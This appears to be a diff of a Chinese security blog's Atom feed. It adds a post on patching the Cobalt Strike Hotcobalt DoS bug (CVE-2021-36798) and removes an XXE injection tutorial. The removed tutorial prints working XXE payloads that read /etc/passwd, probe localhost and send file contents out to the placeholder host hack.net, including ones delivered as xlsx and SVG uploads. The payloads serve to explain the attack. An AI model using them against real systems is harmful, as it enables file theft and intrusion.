@@ -6,7 +6,7 @@
   <link href="https://hosch3n.github.io/atom.xml" rel="self"/>
   
   <link href="https://hosch3n.github.io/"/>
-  <updated>2021-08-03T03:49:16.974Z</updated>
+  <updated>2021-08-05T17:15:54.288Z</updated>
   <id>https://hosch3n.github.io/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>关于修复Hotcobalt的一些小想法</title>
+    <link href="https://hosch3n.github.io/2021/08/06/%E5%85%B3%E4%BA%8E%E4%BF%AE%E5%A4%8DHotcobalt%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%83%B3%E6%B3%95/"/>
+    <id>https://hosch3n.github.io/2021/08/06/%E5%85%B3%E4%BA%8E%E4%BF%AE%E5%A4%8DHotcobalt%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%83%B3%E6%B3%95/</id>
+    <published>2021-08-05T16:21:54.000Z</published>
+    <updated>2021-08-05T17:15:54.288Z</updated>
+    
+    <content type="html"><![CDATA[<p>官方通告说在CobaltStrike4.4版本中修复了一个DoS漏洞Hotcobalt（CVE-2021-36798），跟随参考链接看了sentinel labs的分析。总结就是beacon建立连接后，在解析Screenshot和Keylogger功能返回的数据时，没有对被控客户端返回的数据中声明的文件大小这个值做校验，导致后续申请内存空间时的大小是被控客户端可控的，可以被用来一直申请内存直到占满宕机。</p><p>由于一些众所周之的原因，现在没法更新4.4版本，更不可能补丁对比。但是5年前3.5版本的RCE漏洞其实跟这个有点类似（downloads时ip的位置被控客户端可控，可以被替换为<code>../</code>路径穿越），官方当时的修复措施之一就是判断了beacon在download前有没有过至少一次交互：</p><blockquote><p>The Team Server now checks that the beacon has been tasked at least once before allowing most callback responses from the beacon. This ensures that an attacker can’t stage a fake beacon and start spoofing responses without the operator first interacting with the beacon.</p></blockquote><p>大概猜了下关键字然后全局搜索，在BeaconC2.java中看到了相关判断代码：</p><p><img src="/img/gyxfhcxf_a.png"></p><p>CobaltStrikeParser模拟的beacon上线一般没有实际命令交互的，就能被这个判断给拦下来。所以把这段代码复制到漏洞相关的分支即可：</p><p><img src="/img/gyxfhcxf_b.png"></p><p>重新编译后测试上线可以正常使用截图功能：</p><p><img src="/img/gyxfhcxf_c.png"></p><ul><li>惭愧的是虽然看上去是这么一回事，但是没有仔细去看<a href="https://github.com/Sentinel-One/CobaltStrikeParser/blob/master/extra/communication_poc.py">communication_poc.py</a>和实际打一下做试验。所以只是作为一个抛砖引玉的想法，说错了的话请师傅们拍砖。</li></ul><p>除了这个代码判断外，它默认用的是空UA头<code>EMPTY_UA_HEADERS = &#123;&quot;User-Agent&quot;:&quot;&quot;&#125;</code>发起请求，在profile中屏蔽掉空UA头可以起到缓解作用：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http-config &#123;</span><br><span class="line">    ...</span><br><span class="line">    set block_useragents &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更进一步可以直接关掉stager这个功能，基本就断了CobaltStrikeParser这类蹭payload去解析的工具路子，但是对后渗透会有很大影响：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set host_stage &quot;false&quot;;</span><br></pre></td></tr></table></figure><p>当然也可以像<a href="http://localhost:4000/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/#stager">之前</a>说的，改掉checksum8上线规则、修改默认的抑或密钥、stager下发完payload随时kill掉这些方法辅助规避payload泄漏。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.cobaltstrike.com/2021/08/04/cobalt-strike-dos-vulnerability-cve-2021-36798/">Cobalt Strike DoS Vulnerability (CVE-2021-36798)</a></p><p><a href="https://labs.sentinelone.com/hotcobalt-new-cobalt-strike-dos-vulnerability-that-lets-you-halt-operations/">Hotcobalt – New Cobalt Strike DoS Vulnerability That Lets You Halt Operations</a></p><p><a href="https://research.nccgroup.com/2020/06/15/striking-back-at-retired-cobalt-strike-a-look-at-a-legacy-vulnerability/">Striking Back at Retired Cobalt Strike: A look at a legacy vulnerability</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;官方通告说在CobaltStrike4.4版本中修复了一个DoS漏洞Hotcobalt（CVE-2021-36798），跟随参考链接看了sentinel labs的分析。总结就是beacon建立连接后，在解析Screenshot和Keylogger功能返回的数据时，没有对被</summary>
+      
+    
+    
+    
+    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
+    
+    
+    <category term="idea" scheme="https://hosch3n.github.io/tags/idea/"/>
+    
+    <category term="jar" scheme="https://hosch3n.github.io/tags/jar/"/>
+    
+    <category term="CVE-2021-36798" scheme="https://hosch3n.github.io/tags/CVE-2021-36798/"/>
+    
+  </entry>
   
   <entry>
     <title>VMware vCenter漏洞分析</title>
@@ -552,32 +580,6 @@
     <category term="http" scheme="https://hosch3n.github.io/tags/http/"/>
     
     <category term="smuggling" scheme="https://hosch3n.github.io/tags/smuggling/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>XML基础与XXE注入</title>
-    <link href="https://hosch3n.github.io/2020/08/16/XML%E5%9F%BA%E7%A1%80%E4%B8%8EXXE%E6%B3%A8%E5%85%A5/"/>
-    <id>https://hosch3n.github.io/2020/08/16/XML%E5%9F%BA%E7%A1%80%E4%B8%8EXXE%E6%B3%A8%E5%85%A5/</id>
-    <published>2020-08-16T13:32:00.000Z</published>
-    <updated>2021-03-01T09:43:19.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h2><p>XML是一种被设计用来存储和传输数据的语言，叫作<em>可扩展标记语言</em>，通过自定义标签的形式描述数据。</p><h3 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h3><p>为了区分开表示数据的尖括号和表示结构的标签，在数据中用<code>&amp;lt;</code>和<code>&amp;gt;</code>这类预定义的XML实体来表示左右尖括号。</p><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>XML通过头部的DTD（文档类型定义）来定义文档结构，实际内容直接写在文档里的DTD叫作<code>内部DTD</code>，实际内容放在外面，要通过引用加载的DTD叫作<code>外部DTD</code>，二者可以在XML中混用。</p><h3 id="自定义实体"><a href="#自定义实体" class="headerlink" title="自定义实体"></a>自定义实体</h3><p>如果预定义的XML实体不够用，就可以自定义新的XML实体：</p><p><code>&lt;!DOCTYPE test [ &lt;!ENTITY id &quot;hosch3n&quot; &gt; ]&gt;</code></p><p>这样就可以用<code>&amp;id;</code>表示<code>hosch3n</code>这个值。</p><h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>自定义实体的实际内容不一定要写在DTD里，也可以写在外面然后通过引用加载：</p><p><code>&lt;!DOCTYPE test [ &lt;!ENTITY ext SYSTEM &quot;http://xxx.com&quot; &gt; ]&gt;</code></p><ul><li>支持http、ftp、file等协议</li></ul><h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br></pre></td></tr></table></figure><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1/&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br></pre></td></tr></table></figure><h3 id="OAST"><a href="#OAST" class="headerlink" title="OAST"></a>OAST</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;hack.net&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&quot;http://hack.net/hack.dtd&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><ul><li>数据在服务器端拼接进XML文档</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Apache-POI"><a href="#Apache-POI" class="headerlink" title="Apache POI"></a>Apache POI</h3><ul><li>文件上传xlsx文档</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># xxe.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://hack.net/?%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># [Content_Types].xml</span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://hack.net/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ZIP压缩后改后缀为<code>xlsx</code></p><h3 id="Apache-Batik"><a href="#Apache-Batik" class="headerlink" title="Apache Batik"></a>Apache Batik</h3><ul><li>文件上传SVG头像</li></ul><figure class="highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/hostname&quot;</span> &gt;</span> ]&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;16&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;16&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;XML基础&quot;&gt;&lt;a href=&quot;#XML基础&quot; class=&quot;headerlink&quot; title=&quot;XML基础&quot;&gt;&lt;/a&gt;XML基础&lt;/h2&gt;&lt;p&gt;XML是一种被设计用来存储和传输数据的语言，叫作&lt;em&gt;可扩展标记语言&lt;/em&gt;，通过自定义标签的形式描述数据。&lt;/</summary>
-      
-    
-    
-    
-    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-    <category term="xml" scheme="https://hosch3n.github.io/tags/xml/"/>
-    
-    <category term="xxe" scheme="https://hosch3n.github.io/tags/xxe/"/>
     
   </entry>
   
